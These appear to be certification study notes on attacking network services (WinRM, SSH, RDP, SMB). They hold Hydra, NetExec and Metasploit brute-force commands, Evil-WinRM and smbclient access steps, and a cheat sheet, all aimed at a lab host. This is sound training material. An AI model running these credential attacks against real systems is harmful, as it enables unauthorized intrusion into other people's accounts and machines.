# 🌐 1. Network Services

> [!info]  
> During a penetration test, almost every networked system exposes **services** that allow users or applications to manage, access, transfer, or create data.
> 
> These services are important attack surfaces because they often provide:
> 
> - 🔐 Authentication mechanisms
>     
> - 📂 File and directory access
>     
> - 💻 Remote command execution
>     
> - 🖥️ Remote GUI access
>     
> - 🗄️ Database access
>     
> - 📡 Network management functionality
>     
> 
> Common network services include:
> 
> `FTP` · `SMB` · `NFS` · `IMAP/POP3` · `SSH` · `MySQL/MSSQL` · `RDP` · `WinRM` · `VNC` · `Telnet` · `SMTP` · `LDAP`

> [!tip]  
> **CPTS mindset:** A discovered service is not automatically an exploit. First identify **what service is running → how it authenticates → what credentials you have → what access those credentials provide**.

---

# 🧠 2. Remote Access Services

Suppose we need to manage a Windows server remotely. We need a service capable of providing either:

- 💻 Terminal/command-line access
    
- 🖥️ Graphical access
    
- 📂 Access to system contents
    
- ⚙️ Remote administration
    

For Windows, common remote-management services include:

|Service|Typical Port|Primary Purpose|Typical Access|
|---|--:|---|---|
|`RDP`|`3389/TCP`|Remote graphical desktop|GUI|
|`WinRM`|`5985/TCP`, `5986/TCP`|Windows remote management|PowerShell / command execution|
|`SSH`|`22/TCP`|Secure remote shell and file transfer|Terminal|

> [!important]  
> **SSH is the dominant remote administration protocol on Linux**, while **RDP and WinRM are commonly encountered on Windows**.
> 
> However, SSH can also be enabled on Windows, so **never assume a service exists only on one operating system**.

---

# 🔐 3. Authentication & Password Attacks

Most network services have some form of authentication, commonly involving:

```text
Username + Password
```

However, services can be configured to use stronger mechanisms such as:

```text
Username
   +
Private/Public Key
   +
Certificates / Other Authentication Mechanisms
```

Many environments still use relatively standard/default authentication configurations, making credential attacks relevant during authorized penetration tests.

> [!warning]  
> Password attacks should be performed only against systems where you have authorization. In a CPTS environment, this normally means the assigned HTB target/lab.

---

# 🪟 4. WinRM — Windows Remote Management

## 🧠 4.1 What Is WinRM?

**Windows Remote Management (`WinRM`)** is Microsoft's implementation of the **Web Services Management Protocol (`WS-Management`)**.

It is a network protocol based on **XML web services** and uses the **Simple Object Access Protocol (`SOAP`)** for remote management of Windows systems.

WinRM provides communication between:

```text
WS-Management
      ↓
     WBEM
      ↓
     WMI
      ↓
    DCOM
```

Where:

- **WS-Management** → Web Services Management protocol
    
- **WBEM** → Web-Based Enterprise Management
    
- **WMI** → Windows Management Instrumentation
    
- **DCOM** → Distributed Component Object Model
    

---

## 🔌 4.2 WinRM Ports

WinRM commonly uses:

|Port|Protocol|Purpose|
|--:|---|---|
|`5985`|HTTP|WinRM|
|`5986`|HTTPS|WinRM over TLS/HTTPS|

```text
TCP 5985 → HTTP  → WinRM
TCP 5986 → HTTPS → WinRM
```

> [!important]  
> WinRM is not necessarily enabled by default on Windows 10/11. It must be activated/configured, and organizations may restrict authentication methods or require certificates.

---

# 🛠️ 5. NetExec

[NetExec GitHub repository](https://github.com/Pennyw0rth/NetExec?utm_source=chatgpt.com)

**NetExec** is a network execution and authentication-testing tool useful for interacting with multiple network protocols.

It supports protocols including:

```text
NFS
FTP
SSH
WinRM
SMB
WMI
RDP
MSSQL
LDAP
VNC
```

> [!info]  
> NetExec is especially useful in CPTS because it can test credentials against multiple services and then help enumerate what access those credentials provide.

---

## 💻 5.1 Installing NetExec

```bash
sudo apt-get -y install netexec
```

This installs NetExec through `apt`.

---

# 📖 6. NetExec General Help

Running:

```bash
netexec -h
```

displays general usage information and supported protocols.

```text
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc} ...
```

### 🔎 Important Generic Options

|Option|Purpose|
|---|---|
|`-h`, `--help`|Display help|
|`--version`|Display NetExec version|
|`-t`, `--threads`|Number of concurrent threads|
|`--timeout`|Maximum timeout per thread|
|`--jitter`|Random delay between authentication attempts|
|`--verbose`|Enable verbose output|
|`--debug`|Enable debug information|
|`--no-progress`|Disable progress bar|
|`--log`|Export output to a custom file|
|`-6`|Force IPv6|
|`--dns-server`|Specify DNS server|
|`--dns-tcp`|Use TCP for DNS queries|
|`--dns-timeout`|DNS query timeout|

### 📡 Available Protocols

```text
nfs
ftp
ssh
winrm
smb
wmi
rdp
mssql
ldap
vnc
```

---

# 🔎 7. Protocol-Specific NetExec Help

NetExec allows us to specify a protocol to obtain detailed options.

For example:

```bash
netexec smb -h
```

This displays SMB-specific functionality.

The target can be:

```text
IP
IP range
CIDR
Hostname
FQDN
File containing targets
Nmap XML file
.Nessus file
```

Example positional syntax:

```text
target [target ...]
```

> [!tip]  
> **Mental model:**
> 
> ```text
> netexec
>    ↓
> choose protocol
>    ↓
> provide target
>    ↓
> provide credentials
>    ↓
> enumerate / authenticate / execute
> ```

---

# 🎯 8. NetExec Credential-Attack Syntax

The general syntax is:

```bash
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

For example:

```bash
netexec winrm 10.129.42.197 -u user.list -p password.list
```

Here:

- `winrm` → protocol being tested
    
- `10.129.42.197` → target
    
- `-u user.list` → username list
    
- `-p password.list` → password list
    

---

# 🪟 9. NetExec Against WinRM

```bash
netexec winrm 10.129.42.197 -u user.list -p password.list
```

Example output:

```text
WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

### 🚨 Understanding `(Pwn3d!)`

The important part is:

```text
[Pwn3d!]
```

> [!important]  
> `(Pwn3d!)` indicates that the authenticated account most likely has **command-execution capability** through the tested service.
> 
> It is therefore much more valuable than simply discovering that a username/password combination is valid.

Mental model:

```text
Credential found
      ↓
Authenticate to WinRM
      ↓
Is account authorized for remote execution?
      ↓
   (Pwn3d!)
      ↓
💻 Likely command execution
```

---

# 🐚 10. Evil-WinRM

[Evil-WinRM GitHub repository](https://github.com/Hackplayers/evil-winrm?utm_source=chatgpt.com)

**Evil-WinRM** is a tool specifically designed to interact efficiently with WinRM.

---

## 📦 10.1 Installing Evil-WinRM

```bash
sudo gem install evil-winrm
```

Example installation output:

```text
Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :)
```

---

## 💻 10.2 Evil-WinRM Usage

```bash
evil-winrm -i <target-IP> -u <username> -p <password>
```

Example:

```bash
evil-winrm -i 10.129.42.197 -u user -p password
```

Successful connection:

```text
Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

A successful login gives us a remote PowerShell session.

> [!info]  
> Evil-WinRM uses the **PowerShell Remoting Protocol (`MS-PSRP`)** to establish the remote session.

Mental model:

```text
Valid WinRM Credentials
          ↓
      Evil-WinRM
          ↓
      WinRM Service
          ↓
     MS-PSRP
          ↓
🖥️ Remote PowerShell
```

---

# 🔑 11. SSH — Secure Shell

[SSH Academy reference](https://www.ssh.com/academy/ssh/protocol?utm_source=chatgpt.com)

**Secure Shell (`SSH`)** provides secure remote access to a system.

It can be used to:

- 💻 Execute commands remotely
    
- 📂 Transfer files
    
- 🔐 Authenticate securely
    
- 🛠️ Administrate remote systems
    

The default SSH server port is:

```text
TCP 22
```

---

# 🔐 12. SSH Cryptography

SSH uses multiple cryptographic concepts:

```text
🔒 Symmetric Encryption
🔑 Asymmetric Encryption
#️⃣ Hashing
```

These serve different purposes.

---

## 🔒 12.1 Symmetric Encryption

Symmetric encryption uses the **same key** for encryption and decryption.

```text
        Same Secret Key
        ┌─────────────┐
        ↓             ↓
     Encrypt       Decrypt
        ↓             ↓
        └─── Data ────┘
```

The problem is key distribution:

> If someone obtains the secret key, they may be able to decrypt the protected data.

SSH therefore needs a secure mechanism for establishing the shared secret.

### 🔄 Diffie-Hellman Key Exchange

SSH can use **Diffie-Hellman key exchange** to allow the client and server to establish a shared secret.

Common symmetric algorithms include:

- `AES`
    
- `Blowfish`
    
- `3DES`
    

> [!important]  
> **Symmetric encryption:** one shared secret key is used for encryption/decryption.

---

# 🔑 13. Asymmetric Encryption

Asymmetric encryption uses **two keys**:

```text
🔓 Public Key
🔐 Private Key
```

The private key must remain secret.

A common SSH authentication model is:

```text
Server
  │
  ├── Public Key
  │
  ↓
Client proves possession
of corresponding private key
  │
  ↓
Authentication
```

> [!warning]  
> If an attacker obtains an SSH private key that is accepted by a target and the key is not adequately protected, they may be able to authenticate without knowing a traditional password.

This is why discovered files such as SSH private keys can be extremely valuable during a penetration test.

---

# #️⃣ 14. Hashing

Hashing transforms data into a value using a mathematical one-way function.

SSH uses hashing for purposes such as **message integrity/authenticity checking**.

Conceptually:

```text
Original Data
     ↓
 Hash Function
     ↓
Hash Value
```

Unlike encryption, hashing is designed to be **one-way**.

> [!important]  
> Do not confuse:
> 
> **Encryption** → designed to be reversible with the appropriate key.
> 
> **Hashing** → designed as a one-way transformation.

---

# 🚪 15. Hydra — SSH Brute Force

Hydra can be used to perform password attacks against SSH.

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
```

Where:

- `-L user.list` → username list
    
- `-P password.list` → password list
    
- `ssh://10.129.42.197` → SSH target
    

Example successful result:

```text
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

> [!warning]  
> SSH servers can limit or dislike high numbers of concurrent authentication attempts. Hydra therefore recommends reducing parallelism, for example with:
> 
> ```bash
> -t 4
> ```

---

# 💻 16. Connecting Through SSH

Most Linux distributions include an OpenSSH client.

```bash
ssh user@10.129.42.197
```

Example:

```text
The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.42.197' (ECDSA) to the list of known hosts.


user@10.129.42.197's password: ********

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:\Users\user>
```

> [!info]  
> The first connection may display the server's host-key fingerprint and ask whether you trust it. Accepting it adds the host key to the local `known_hosts` file.

---

# 🖥️ 17. RDP — Remote Desktop Protocol

Microsoft's **Remote Desktop Protocol (`RDP`)** provides remote graphical access to Windows systems.

Default port:

```text
TCP 3389
```

RDP allows users, administrators, and support personnel to remotely control Windows systems.

---

## 🧠 17.1 RDP Architecture

RDP defines two main participants:

```text
🖥️ Terminal Client
       │
       │ RDP
       ↓
🖥️ Terminal Server
       │
       ↓
Actual Windows Session
```

The client remotely controls the server.

RDP can transfer:

- 🖼️ Display/image data
    
- 🔊 Audio
    
- ⌨️ Keyboard input
    
- 🖱️ Mouse/pointing-device input
    
- 🖨️ Printer access
    
- 💾 Access to storage media
    

Technically, RDP operates at the **application layer** and can use both:

```text
TCP
UDP
```

---

# 🔓 18. Hydra — RDP

Hydra can also perform RDP password attacks:

```bash
hydra -L user.list -P password.list rdp://10.129.42.197
```

Example output:

```text
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

> [!important]  
> A valid username/password does **not necessarily mean the account can use RDP**.
> 
> The output can indicate that an account is valid but **not active for remote desktop**.

---

# 🖥️ 19. xFreeRDP

Linux provides several RDP clients, including:

- `Remmina`
    
- `xfreerdp`
    

For CPTS work, we can use **xfreerdp**.

### 💻 Basic Syntax

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

Example:

```bash
xfreerdp /v:10.129.42.197 /u:user /p:password
```

Example certificate prompt:

```text
New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb

Do you trust the above certificate? (Y/T/N) Y
```

> [!info]  
> A successful RDP connection provides a **graphical Windows desktop session**, unlike WinRM/Evil-WinRM or SSH, which primarily provide terminal access.

---

# 📂 20. SMB — Server Message Block

[Microsoft SMB protocol overview](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview?utm_source=chatgpt.com)

**Server Message Block (`SMB`)** is a network protocol used for transferring/accessing data between clients and servers.

SMB commonly provides:

- 📂 File sharing
    
- 📁 Directory sharing
    
- 🖨️ Printer sharing
    
- 🖥️ Windows network resource access
    

> [!important]  
> SMB is often described as a network file-sharing protocol. It is **not itself a filesystem**.

SMB can be conceptually compared with **NFS**, which provides network filesystem functionality commonly encountered on Unix/Linux systems.

---

# 🌍 21. SMB, CIFS & Samba

SMB is also associated with **Common Internet File System (`CIFS`)**.

SMB/CIFS allows network resources to be accessed across different platforms, including:

```text
Windows
Linux
macOS
```

**Samba** is an open-source implementation providing SMB functionality.

Mental model:

```text
             SMB
              │
       ┌──────┼──────┐
       ↓      ↓      ↓
    Windows  Linux   macOS
              │
           Samba
```

---

# 🔓 22. Hydra — SMB

Hydra can also be used to test SMB credentials:

```bash
hydra -L user.list -P password.list smb://10.129.42.197
```

Successful example:

```text
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```

> [!warning]  
> SMB generally does not like large numbers of parallel connections, so Hydra reduces the number of tasks.

---

# ⚠️ 23. Hydra SMB Error

An older Hydra version may fail against modern SMB implementations:

```bash
hydra -L user.list -P password.list smb://10.129.42.197
```

Example:

```text
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

### 🧠 Why?

The likely cause is an **outdated THC-Hydra version that cannot properly handle SMBv3 replies**.

Possible approaches:

```text
Old Hydra
   ↓
SMBv3 response
   ↓
❌ "invalid reply"
```

Possible solutions:

1. Manually update and recompile Hydra.
    
2. Use another tool capable of handling the target SMB implementation.
    

One powerful alternative is the **Metasploit Framework**.

> [!warning]  
> An `invalid reply` does **not automatically mean the credentials are wrong**. Tool/protocol compatibility can be the problem.

---

# 🧰 24. Metasploit — SMB Login Scanner

[Metasploit Framework](https://www.metasploit.com/?utm_source=chatgpt.com)

Start Metasploit quietly:

```bash
msfconsole -q
```

Select the SMB login scanner:

```text
msf6 > use auxiliary/scanner/smb/smb_login
```

View its options:

```text
msf6 auxiliary(scanner/smb/smb_login) > options
```

Important options include:

|Option|Purpose|
|---|---|
|`ABORT_ON_LOCKOUT`|Stop when account lockout is detected|
|`BLANK_PASSWORDS`|Try blank passwords|
|`BRUTEFORCE_SPEED`|Brute-force speed from `0` to `5`|
|`PASS_FILE`|Password file|
|`SMBUser`|Username|
|`SMBPass`|Password|
|`RHOSTS`|Target host(s)|
|`RPORT`|SMB port; default `445`|
|`SMBDomain`|Windows domain|
|`STOP_ON_SUCCESS`|Stop guessing after successful authentication|
|`THREADS`|Number of concurrent threads|
|`USERPASS_FILE`|File containing username/password pairs|
|`USER_AS_PASS`|Try username as password|
|`USER_FILE`|Username file|
|`VERBOSE`|Display attempts|

### ⚙️ Relevant Default Values

```text
RPORT              445
THREADS            1
STOP_ON_SUCCESS    false
VERBOSE            true
```

---

# 💻 25. Configuring Metasploit SMB Login

Set the username list:

```text
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list
```

Set the password list:

```text
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list
```

Set the target:

```text
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197
```

Run:

```text
msf6 auxiliary(scanner/smb/smb_login) > run
```

Successful authentication:

```text
[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The important result is:

```text
Success: '.\user:password'
```

This confirms valid SMB credentials.

---

# 📊 26. NetExec — Enumerating SMB Shares

Once valid credentials have been discovered, do **not** stop at authentication.

The next question is:

> **What can this account actually access?**

NetExec can enumerate SMB shares:

```bash
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```

Example:

```text
SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```

### 🔎 Important Findings

```text
ADMIN$     → Remote administration share
C$         → Default administrative share
SHARENAME  → READ,WRITE
IPC$       → Remote IPC
```

The most interesting share in this example is:

```text
SHARENAME → READ,WRITE
```

because the authenticated user can both **read and write** files there.

> [!important]  
> Valid credentials are only the beginning. Always determine the **authorization level** associated with those credentials.

---

# 📂 27. smbclient

[smbclient documentation](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html?utm_source=chatgpt.com)

`smbclient` is a command-line SMB client that allows us to interact with SMB shares.

Depending on our permissions, we can:

- 📂 List files
    
- 📥 Download files
    
- 📤 Upload files
    
- 🔎 Inspect share contents
    
- 🛠️ Interact with remote resources
    

---

## 💻 27.1 Connecting to an SMB Share

```bash
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

The client asks for the user's password:

```text
Enter WORKGROUP\user's password: *******
```

Successful connection:

```text
Try "help" to get a list of possible commands.


smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \> 
```

The SMB shell prompt:

```text
smb: \>
```

means we are interacting with the remote share.

The `ls` command lists its contents.

> [!tip]  
> Once authenticated to SMB, think in terms of:
> 
> ```text
> 🔐 Authenticate
>       ↓
> 📊 Enumerate shares
>       ↓
> 🔎 Identify permissions
>       ↓
> 📂 Connect to interesting share
>       ↓
> 📥 Read / 📤 Write files
>       ↓
> 🧠 Search for credentials, sensitive data, or attack paths
> ```

---

# 🧩 28. CPTS Network-Service Attack Methodology

A useful exam mental model is:

```text
                 🌐 DISCOVER SERVICE
                        ↓
                🔎 IDENTIFY PROTOCOL
                        ↓
              ┌─────────┴─────────┐
              ↓                   ↓
         🔐 AUTHENTICATION    🛠️ ENUMERATION
              ↓                   ↓
        User/pass? Keys?     Shares? Users?
              ↓                   ↓
        🎯 TEST CREDENTIALS
              ↓
       ┌──────┼────────┬────────┐
       ↓      ↓        ↓        ↓
     WinRM    SSH      RDP      SMB
       ↓      ↓        ↓        ↓
   PS Shell  Shell    GUI    Shares
       │      │        │        │
       └──────┴────────┴────────┘
                    ↓
            📌 DETERMINE ACCESS
                    ↓
          💻 EXECUTE / 📂 READ
                    ↓
            🔎 ENUMERATE FURTHER
                    ↓
              🎯 NEXT ATTACK PATH
```

---

# 📊 29. Network Services Quick Reference

|Service|Default Port|Main Use|Useful Tool(s)|
|---|--:|---|---|
|`WinRM`|`5985/5986`|Windows remote management|`NetExec`, `Evil-WinRM`|
|`SSH`|`22`|Secure remote shell/file transfer|`Hydra`, `ssh`|
|`RDP`|`3389`|Windows graphical remote access|`Hydra`, `xfreerdp`, `Remmina`|
|`SMB`|`445`|File/directory/printer sharing|`Hydra`, `Metasploit`, `NetExec`, `smbclient`|

---

# 🧠 30. Authentication → Access Mental Model

> [!important]  
> **Never treat "valid credentials" as the end of the attack.**
> 
> The CPTS-relevant question is:
> 
> **"What does this account allow me to do?"**

```text
🔑 VALID CREDENTIALS
        ↓
🌐 Authenticate to Service
        ↓
🔎 Enumerate Permissions
        ↓
       ┌──────────────────┐
       │                  │
       ↓                  ↓
   Read Access        Write/Exec Access
       ↓                  ↓
 📂 Sensitive Data     💻 Remote Access
       │                  │
       └────────┬─────────┘
                ↓
         🔎 Further Enumeration
                ↓
          🎯 Privilege Escalation
          / Lateral Movement
          / Objective
```

---

# 🎯 31. CPTS Cheat Sheet

## 🪟 WinRM

```bash
# Credential attack
netexec winrm <target> -u <users> -p <passwords>

# Connect
evil-winrm -i <target-IP> -u <username> -p <password>
```

**Ports:**

```text
5985 → HTTP
5986 → HTTPS
```

**Key indicator:**

```text
(Pwn3d!)
```

→ likely remote command execution capability.

---

## 🔑 SSH

```bash
# Credential attack
hydra -L user.list -P password.list ssh://<target>

# Connect
ssh user@<target>
```

**Port:**

```text
22/TCP
```

**Cryptography concepts:**

```text
Symmetric → shared secret
Asymmetric → public/private keys
Hashing → one-way integrity/authenticity mechanism
```

---

## 🖥️ RDP

```bash
# Credential attack
hydra -L user.list -P password.list rdp://<target>

# Connect
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

**Port:**

```text
3389/TCP
```

**Important:**

```text
Valid credentials
      ≠
Guaranteed RDP access
```

An account may be valid but not permitted to log in through Remote Desktop.

---

## 📂 SMB

```bash
# Credential attack
hydra -L user.list -P password.list smb://<target>

# Metasploit alternative
msfconsole -q
use auxiliary/scanner/smb/smb_login

# Enumerate shares
netexec smb <target> -u "user" -p "password" --shares

# Connect to share
smbclient -U user \\\\<target>\\<SHARE>
```

**Port:**

```text
445/TCP
```

**Important tools:**

```text
Hydra
Metasploit
NetExec
smbclient
```

---

# 🧠 32. Final Mental Model

```text
🌐 NETWORK SERVICE
        ↓
🔎 WHAT IS IT?
        ↓
📍 WHAT PORT?
        ↓
🔐 HOW DOES IT AUTHENTICATE?
        ↓
🎯 CAN I VALIDATE CREDENTIALS?
        ↓
🪪 WHAT USER AM I?
        ↓
📊 WHAT PERMISSIONS DO I HAVE?
        ↓
💻 CAN I EXECUTE?
📂 CAN I READ?
📤 CAN I WRITE?
        ↓
🔎 WHAT NEW INFORMATION/ACCESS
   DOES THIS GIVE ME?
        ↓
🎯 FOLLOW THE NEXT ATTACK PATH
```

> [!success]  
> **CPTS takeaway:** Network services are valuable attack surfaces because authentication often converts a simple network connection into **authenticated access**. The workflow is not merely _"find a password"_ — it is **identify the service → test authentication → determine authorization → interact with the service → enumerate the access gained → use that access to progress toward the objective**.